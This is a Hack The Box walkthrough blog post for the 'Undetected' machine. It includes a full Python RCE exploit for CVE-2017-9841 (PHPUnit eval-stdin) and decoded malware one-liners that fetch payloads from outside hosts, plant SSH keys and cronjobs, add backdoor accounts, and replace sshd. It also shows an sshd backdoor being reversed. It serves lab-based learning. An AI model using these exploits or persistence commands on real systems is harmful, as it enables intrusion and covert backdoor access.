---
title: "Hack The Box - Undetected Walkthrough"
date: 2022-07-19T09:00:00+02:00
description: "Hack The Box Undetected Walkthrough/Write-Up"
featured: false
draft: false
toc: false
# menu: main
usePageBundles: false
featureImage: "/images/undetected_htb.png"
#featureImageAlt: 'Description of image'
#featureImageCap: 'This is the featured image.'
thumbnail: "/images/undetected_htb.png"
shareImage: "/images/undetected_htb.png"
codeMaxLines: 20
codeLineNumbers: false
figurePositionShow: true
categories:
  - Walkthroughs
tags:
  - Hack the Box
  - Linux
---
Today we will be taking a look at the medium box "Undetected" from Hack The Box. The foothold for the box can be found through a vulnerable php script in a directory that should not be world accessible. The script allows for remote code execution onto the box as the www-data user. We then escalate to user by finding an odd looking backup file which is actually an ELF compiled exploit. We can look at the strings of the compiled file to find user credentials. We then find an encoded backdoor that hints at another executable (when decoded). This executable has to be reversed in Ghidra to find the root SSH password.  

## Foothold
As usual, we start off by running a full tcp nmap scan on all ports to enumerate all services and their corresponding version numbers. 

```sh
nmap -sC -sV -p- -oA nmap/initial 10.129.114.58
```

The nmap scan comes back with the following results. 

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

We can see port 22  running a recent version of SSH. Let's take a look at the website. We can see its title is "Diana's Jewelry". Let's start a gobuster scan to check for interesting files and directories.

```sh
gobuster dir -u http://10.129.114.58/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster.out.ip -x php
```

Which doesn't provide any interesting results. While manually enumerating the website I hover over "Store", which redirects to "store.djewelry.htb". Let's add store.djewelry.htb to our /etc/hosts file and visit it. Let's start a gobuster on this virtual host.

```sh
gobuster dir -u http://store.djewelry.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster.out -x php
```

Gobuster provides us the following results. 

```text
/images               (Status: 301) [Size: 325]
/js                   (Status: 301) [Size: 321]
/css                  (Status: 301) [Size: 322]   
/login.php            (Status: 200) [Size: 4129]                                       
/cart.php             (Status: 200) [Size: 4396]                                       
/products.php         (Status: 200) [Size: 7447]                                       
/index.php            (Status: 200) [Size: 6215]                                       
/fonts                (Status: 301) [Size: 324] 
/vendor               (Status: 301) [Size: 325]
/server-status        (Status: 403) [Size: 283]
```

Most of the .php locations lead to dead ends because the website doesn't seem to have an actual backend. Directory listing is enabled, so we can manually look through the directories that we found. In the /vendor/ directory we find a "phpdocumentor" directory. I run searchsploit to check for vulnerabilities.

```sh
kali@kali-$ searchsploit phpdocumentor                                                                                    
------------------------------------------------------------------------------
Exploit Title                                                                 
------------------------------------------------------------------------------
phpDocumentor 1.2/1.3 - Forum Lib Variable Cross-Site Scripting                
phpDocumentor 1.3.0 rc4 - Remote Command Execution                              
------------------------------------------------------------------------------
```

We see a remote code execution vulnerability. Unfortunately the version number doesn't match, and the files it needs aren't located on the web server. Besides this finding, the directory listing doesn't provide us with any interesting information. 

We know that the box uses virtual hosts, so let's enumerate the web server to find out whether there are any more virtual hosts that we can look into. To scan for virtual hosts the following wfuzz command is used. 

```sh
wfuzz -c -u http://store.djewelry.htb/ -H "Host: FUZZ.djewelry.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 15283 -f wfuzz.out
```

The only host that we find is store. 

```text
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000081:   200        195 L    475 W      6203 Ch     "store" 
```

We can try to use a more extensive subdomain list.

```sh
wfuzz -c -u http://store.djewelry.htb/ -H "Host: FUZZ.djewelry.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 15283 -f wfuzz.out
```

But no luck. 

```text
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000081:   200        195 L    475 W      6203 Ch     "store"                                                                                                                                                                   
000009532:   400        10 L     35 W       304 Ch      "#www"                                                                                                                                                                    
000010581:   400        10 L     35 W       304 Ch      "#mail"                                                                                                                                                                   
000047706:   400        10 L     35 W       304 Ch      "#smtp"
```

Let's run Nikto to see whether we maybe missed something in our basic web enumeration.

```sh
nikto -h store.djewelry.htb
```

Nikto comes back with the following results.

```text
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.114.58
+ Target Hostname:    store.djewelry.htb
+ Target Port:        80
+ Start Time:         2022-04-08 13:55:11 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ /login.php: Admin login page/section found.
+ 7863 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-04-08 13:58:00 (GMT2) (169 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

But doesn't provide us any more information that can be leveraged towards obtaining a foothold onto the server. I try to find more information over UDP, so I run the following UDP nmap scan.

```sh
sudo nmap -sC -sV -sU 10.129.114.58
```

But it also doesn't show us anything of use.

```text
PORT      STATE         SERVICE      REASON              VERSION
53/udp    closed        domain       port-unreach ttl 63
67/udp    closed        dhcps        port-unreach ttl 63
68/udp    open|filtered dhcpc        no-response
69/udp    open|filtered tftp         no-response
123/udp   open|filtered ntp          no-response
135/udp   open|filtered msrpc        no-response
137/udp   closed        netbios-ns   port-unreach ttl 63
138/udp   closed        netbios-dgm  port-unreach ttl 63
139/udp   open|filtered netbios-ssn  no-response
161/udp   open|filtered snmp         no-response
162/udp   open|filtered snmptrap     no-response
445/udp   closed        microsoft-ds port-unreach ttl 63
500/udp   closed        isakmp       port-unreach ttl 63
514/udp   closed        syslog       port-unreach ttl 63
520/udp   open|filtered route        no-response
631/udp   closed        ipp          port-unreach ttl 63
1434/udp  closed        ms-sql-m     port-unreach ttl 63
1900/udp  open|filtered upnp         no-response
4500/udp  closed        nat-t-ike    port-unreach ttl 63
49152/udp closed        unknown      port-unreach ttl 63
```

So far this box has been a struggle. After looking at hints in the HTB official discussion, I decided to take another look at the /vendor/ directory. After a while of searching I found that phpunit is vulnerable to a remote code execution vulnerability. I didn't find this the first time because while I was looking through searchsploit I looked for "phpunit" instead of "php unit" with a space... Ugh. 

Anyways, the eval-stdin.php file located in http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php is vulnerable to CVE-2017-9841. I clone the python exploit script from exploitdb.

```python
# Exploit Title: PHP Unit 4.8.28 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 2022/01/30
# Exploit Author: souzo
# Vendor Homepage: phpunit.de
# Version: 4.8.28
# Tested on: Unit
# CVE : CVE-2017-9841

import requests
from sys import argv
phpfiles = ["/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]

def check_vuln(site):
    vuln = False
    try:
        for i in phpfiles:
            site = site+i
            req = requests.get(site,headers= {
                "Content-Type" : "text/html",
                "User-Agent" : f"Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
            },data="<?php echo md5(phpunit_rce); ?>")
            if "6dd70f16549456495373a337e6708865" in req.text:
                print(f"Vulnerable: {site}")
                return site
    except:
        return vuln
def help():
    exit(f"{argv[0]} <site>")

def main():
    if len(argv) < 2:
        help()
    if not "http" in argv[1] or not ":" in argv[1] or not "/" in argv[1]:
        help()
    site = argv[1]
    if site.endswith("/"):
        site = list(site)
        site[len(site) -1 ] = ''
        site = ''.join(site)

    pathvuln = check_vuln(site)
    if pathvuln == False:
        exit("Not vuln")
    try:
        while True:
            cmd = input("> ")
            req = requests.get(str(pathvuln),headers={
                "User-Agent" : f"Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
                "Content-Type" : "text/html"
            },data=f'<?php system(\'{cmd}\') ?>')
            print(req.text)
    except Exception as ex:
        exit("Error: " + str(ex))
main()
```

And run it.

```sh
python3 50702.py http://store.djewelry.htb/
Vulnerable: http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
> whoami
www-data
```

We have our foothold as www-data. Let's stabilize our shell, and look for our privilege escalation path to the Steven user. 

## User shell
After some manual enumeration I decided to run Linpeas. I find two very interesting results. One being a backup file called /var/backups/info, and the other being a cronjob that is being ran as root (* 3 * * * root /var/lib/.main). When searching for the /var/lib/.main I couldn't find the .main file. Therefore I skipped that and looked into /var/backups/info. 

```sh
> file /var/backups/info

/var/backups/info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped
```

Looks like we are dealing with an x64 ELF binary. It's not stripped, thus comments and other useful information will still be inside of it. The binary is dynamically linked, thus it uses on-the-box libraries. Let's take a look at its strings (for some reason I can't use the strings command, so I ended up running cat). Besides all of the unreadable binary data, we also see some text that we can kindof make sense of. 

```sh
> cat /var/backups/info

fork()/etc/shadow[.] checking if we got root[-] something went wrong =([+] 
got r00t ^_^[-] unshare(CLONE_NEWUSER)deny/proc/self/setgroups[-] write_file(/proc/self/set_groups)0 %d 1
/proc/self/uid_map[-] write_file(/proc/self/uid_map)/proc/self/gid_map[-] write_file(/proc/self/gid_map)[-] sched_setaffinity()/sbin/ifconfig lo up[-] system(/sbin/ifconfig lo up)[.] starting[.] namespace sandbox set up[.] KASLR bypass
 enabled, getting kernel addr[.] done, kernel text:   %lx
[.] commit_creds:        %lx
[.] prepare_kernel_cred: %lx
[.] native_write_cr4:    %lx
[.] padding heap[.] done, heap is padded[.] SMEP & SMAP bypass enabled, turning them off[.] done, SMEP & SMAP should be off now[.] executing get root payload %p
```

It almost looks like some sort of exploit or at least a binary that is checking if it can get root permissions, and if so, it will execute some task. Let's download the binary off of this box and analyze it in Ghidra. To accomplish this I use netcat. On the receiver box I run.

```sh
nc -nvlp 9001 > binary.elf
```

On the sending box I run.

```sh
> md5sum /var/backups/info
04060ea986c7bacdc64130a1d7b8ca2d

> /usr/bin/nc -w 3 10.10.14.12 9001 < /var/backups/info
```

We download the file and check whether we didn't lose any data along the way.

```sh
> nc -nvlp 9001 > binary.elf                     
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.129.114.58] 58328

> md5sum binary.elf
04060ea986c7bacdc64130a1d7b8ca2d
```

The md5sums match, so we should be good to go. Let's run strings on the file before opening it, as we couldn't do this while it was still on the hackthebox VM.

```sh
strings binary.elf

7767[...]56d7066696c65732e787[...]72732e74787b20726[...]6572732e7478[...]743b
```

Given the characters 0-9 and a-f this looks like a hexdump. I use [Cyberchef](https://gchq.github.io/CyberChef/) to decode it for us. It shows the following results.

```sh
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHxxxxxx1IUrhZanRuDZhf1oIdnxxxxxegBXk.VtGg78eL7WxxxxxxBtPu8Ufm9hM0R/BLxxxxQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```

We see that there is a hash echo'd to the /etc/shadow file, meaning that if we can crack it, we will be able to log onto the box with the cracked password. We get rid of the surrounding data and only specify the hash.

```text
$6$xxxxx3aYht4$1IUrhxxxxxxxxxxxlwbkegBXk.VtGg78eL7WBM6OxM0R/BLdACoQ0T9n/
```

We then use john to crack the hash.

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Which finds us an SSH password! As we had our interactive session on the box, we can check the /etc/passwd for all users on the box. 

```sh
cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
```

Looks like our user is named steven1. Let's try to use the cracked credentials to SSH onto the system as steven1.

```sh
ssh steven1@10.129.114.58

steven@production:~$ whoami
steven

steven@production:~$ ls
user.txt
```

Nice, we got our user flag. Interestingely enough we login as steven1, but turn out to to be the steven user. Not sure why this is the case. Anyways, let's escalate to root. 

## Privilege Escalation
Let's run linpeas as our new user. Linpeas returns some interesting results regarding emails owned by Steven.

```sh
[+] Mails (limit 50)                                                                                                                                                                                                                       
17793 4 -rw-rw---- 1 steven mail 966 Jul 25 2021 /var/mail/steven 
17793 4 -rw-rw---- 1 steven mail 966 Jul 25 2021 /var/spool/mail/steven 
```

Let's read the contents of the email.

```text
steven@production:~$ cat /var/mail/steven

From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
        Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```

The email is sent by root@production, and is ended written by the sysadmin. It looks like there is something interesting going on with the apache2 service. I looked through the enabled sites and configurations but there were no interesting configuration entries. 

Apache is located in the /usr/lib/apache2 directory. Let's take a look. 

```sh
ls -lah /usr/lib/apache2/modules

[...]
-rw-r--r-- 1 root root 4.5M Nov 25 23:16 libphp7.4.so
[...]
-rw-r--r-- 1 root root  23K Jan  5 14:49 mod_proxy_uwsgi.so
-rw-r--r-- 1 root root  19K Jan  5 14:49 mod_proxy_wstunnel.so
-rw-r--r-- 1 root root  15K Jan  5 14:49 mod_ratelimit.so
-rw-r--r-- 1 root root  34K May 17  2021 mod_reader.so
-rw-r--r-- 1 root root  15K Jan  5 14:49 mod_reflector.so
-rw-r--r-- 1 root root  31K Jan  5 14:49 mod_remoteip.so
-rw-r--r-- 1 root root  19K Jan  5 14:49 mod_reqtimeout.so
[...]
```

Theres a lot of files in the directory, but only two files that were edited on a date different than January 5th. The two files are libphp7.4.so and mod_reader.so. Let's download the two files to our attack VM. On the receiver box I start two listeners. 

```sh
nc -nvlp 9001 > libphp7.4.so
nc -nvlp 9002 > mod_reader.so
```

And on the sending box I run the two following nc commands.

```sh
steven@production:/usr/lib/apache2/modules$ md5sum libphp7.4.so
026789ec895aac3f941f36bc1254c6da  libphp7.4.so

steven@production:/usr/lib/apache2/modules$ md5sum mod_reader.so
5ef63371b6a138253a87aa1f79abf199  mod_reader.so

steven@production:/usr/lib/apache2/modules$ /usr/bin/nc -w 3 10.10.14.12 9001 < libphp7.4.so

steven@production:/usr/lib/apache2/modules$ /usr/bin/nc -w 3 10.10.14.12 9002 < mod_reader.so
```

I check the md5sums, and they match. I run strings on the libphp7.4.so, but I don't see any interesting information. I then run strings on mod_reader.so, and find the following base64 encoded string.

```sh
strings mod_reader.so

d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
```

Let's use the built-in base64 package to decode it.

```sh
echo -n "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk" | base64 -d
```

And we find the following decoded info.

```sh
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
```

This box has a very interesting theme. I reversed the backup file in Ghidra, and it seemed to be a privilege escalation exploit. Then we find this, which appears to download malicious software from sharefiles.xyz, and overwrite the /usr/sbin/sshd file. Looks like a malware infected box. Anyways, let's analyze this /usr/sbin/sshd file in Ghidra as well. First, we need to download it to our box.

```sh
nc -nvlp 9003 > sshd
```

And we download the file

```sh
steven@production:/usr/lib/apache2/modules$ md5sum /usr/sbin/sshd
9ae629656c6f72dc957358b1f41df27e  /usr/sbin/sshd

steven@production:/usr/lib/apache2/modules$ /usr/bin/nc -w 3 10.10.14.12 9002 < /usr/sbin/sshd
```

Let's take a look at the file type and the way it's compiled.

```sh
file sshd      

sshd: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=81f92a57f5fc9f678359f6da9f922af23b7fd8bd, for GNU/Linux 3.2.0, with debug_info, not stripped
```

sshd is an x64 ELF binary that is not stripped, meaning we can still see function names and comments in the binary, and is dynamically linked, thus requiring installed libraries on the system to run. Additionally, it's a pie executable, meaning it has some protections built-in with regards to binary exploitation. 

We open Ghidra, create a new project and let Ghidra auto analyze the ELF binary. In the Symbol tree, we navigate to Functions and see the functions that are being called in the binary. Unfortunately for us, there's a lot of different folders with different functions available in the ELF. Luckily for us I went through a few, starting from A, and ended up finding the perfect function by trial and error. Within the A directory, there is a function called "auth_password". Let's look at its pseudo code. 

```c
int auth_password(ssh *ssh,char *password)

{
  Authctxt *ctxt;
  passwd *ppVar1;
  int iVar2;
  uint uVar3;
  byte *pbVar4;
  byte *pbVar5;
  size_t sVar6;
  byte bVar7;
  int iVar8;
  long in_FS_OFFSET;
  char backdoor [31];
  byte local_39 [9];
  long local_30;
  
  bVar7 = 0xd6;
  ctxt = (Authctxt *)ssh->authctxt;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  backdoor._28_2_ = 0xa9f4;
  ppVar1 = ctxt->pw;
  iVar8 = ctxt->valid;
  backdoor._24_4_ = 0xbcf0b5e3;
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
  backdoor[30] = -0x5b;
  backdoor._0_4_ = 0xf0e7abd6;
  backdoor._4_4_ = 0xa4b3a3f3;
  backdoor._8_4_ = 0xf7bbfdc8;
  backdoor._12_4_ = 0xfdb3d6e7;
  pbVar4 = (byte *)backdoor;
  while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
  }
  iVar2 = strcmp(password,backdoor);
  uVar3 = 1;
  if (iVar2 != 0) {
    sVar6 = strlen(password);
    uVar3 = 0;
    if (sVar6 < 0x401) {
      if ((ppVar1->pw_uid == 0) && (options.permit_root_login != 3)) {
        iVar8 = 0;
      }
      if ((*password != '\0') ||
         (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) {
        if (auth_password::expire_checked == 0) {
          auth_password::expire_checked = 1;
          iVar2 = auth_shadow_pwexpired(ctxt);
          if (iVar2 != 0) {
            ctxt->force_pwchange = 1;
          }
        }
        iVar2 = sys_auth_passwd(ssh,password);
        if (ctxt->force_pwchange != 0) {
          auth_restrict_session(ssh);
        }
        uVar3 = (uint)(iVar2 != 0 && iVar8 != 0);
      }
    }
  }
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
```

We can see that there should be 31 values in the backdoor array due to the following line.

```c
char backdoor [31];
```

Further down in the pseudo code we can see 31 characters being added.

```c
backdoor._28_2_ = 0xa9f4;
ppVar1 = ctxt->pw;
iVar8 = ctxt->valid;
backdoor._24_4_ = 0xbcf0b5e3;
backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
backdoor[30] = -0x5b;
backdoor._0_4_ = 0xf0e7abd6;
backdoor._4_4_ = 0xa4b3a3f3;
backdoor._8_4_ = 0xf7bbfdc8;
backdoor._12_4_ = 0xfdb3d6e7;
```

We can see that the backdoor bytes are written to a bpVar4 variable. 

```c
pbVar4 = (byte *)backdoor;
```

Which is later on being xored with the value of 0x96 (due to the ^ sign).

```c
while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
  }
```

Meaning we need to get the 31 byte array, and xor it with a key of 96 to restore the original contents. We first store the 31 bytes starting from the "backdoor 30" line, as it adds up to 31 bytes. The line contains a negative -0x5b character. We use Ghidra to translate it by right clicking on the character and selecting "char". It's translated to "\\xa5". I chose to create hex values out of the entire string, and convert it.

```python
string = "a5a9f4bcf0b5e3b2d6f4a0fda0b3d6fdb3d6e7f7bbfdc8a4b3a3f3f0e7abd6"

buffer = "\\x" + ", \\x".join(string[i:i+2] for i in range (0, len(string), 2))

print(buffer)

>> \xa5, \xa9, \xf4, \xbc, \xf0, \xb5, \xe3, \xb2, \xd6, \xf4, \xa0, \xfd, \xa0, \xb3, \xd6, \xfd, \xb3, \xd6, \xe7, \xf7, \xbb, \xfd, \xc8, \xa4, \xb3, \xa3, \xf3, \xf0, \xe7, \xab, \xd6
```

I could've used cyberchef right away on the string value I put in my Python script, but I wanted to test my logic :) I now put the hex values in cyberchef, swap endianness with a word length of 31 bytes, convert it from hex and XOR it with a key of 96. The whole recipe can be found [here](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&input=XHhhNSwgXHhhOSwgXHhmNCwgXHhiYywgXHhmMCwgXHhiNSwgXHhlMywgXHhiMiwgXHhkNiwgXHhmNCwgXHhhMCwgXHhmZCwgXHhhMCwgXHhiMywgXHhkNiwgXHhmZCwgXHhiMywgXHhkNiwgXHhlNywgXHhmNywgXHhiYiwgXHhmZCwgXHhjOCwgXHhhNCwgXHhiMywgXHhhMywgXHhmMywgXHhmMCwgXHhlNywgXHhhYiwgXHhkNg). We found the root SSH password! 

Now that we decoded the password, we can login to the box as the root user.

```sh
kali@kali:~$ ssh root@store.djewelry.htb

root@production:~# whoami
root

root@production:~# ls
root.txt
```

And we completed the box. I have to point out that I really liked this box, as it had several different interesting and original ideas. The box had a relatively low rating on Hack The Box, but I think that people just don't like reverse engineering type of systems. Anyways, I hope you learnt something new today. Have a great day! 
